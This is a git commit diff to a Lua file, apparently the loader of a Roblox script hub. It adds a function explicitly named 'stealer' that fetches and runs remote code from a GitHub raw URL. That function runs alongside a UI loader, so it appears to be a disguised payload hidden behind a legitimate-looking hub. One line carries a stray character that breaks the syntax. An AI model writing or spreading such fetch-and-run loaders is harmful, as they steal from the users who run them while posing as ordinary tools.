6595b02009443fdbb8cb6deaddd0bfc5be159687
ZephyrHub1 <quanghaha10092008@gmail.com>
2025-09-15 19:53:18 +0700

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,2 +1,10 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/MoziIHub/refs/heads/main/Alr"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/quangliz11/lolohahaha/refs/heads/main/cacbeo"))()
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/quangliz11/lolohahaha/refs/heads/main/cacbeo"))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/MoziIHub/refs/heads/main/Alr"))()l
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
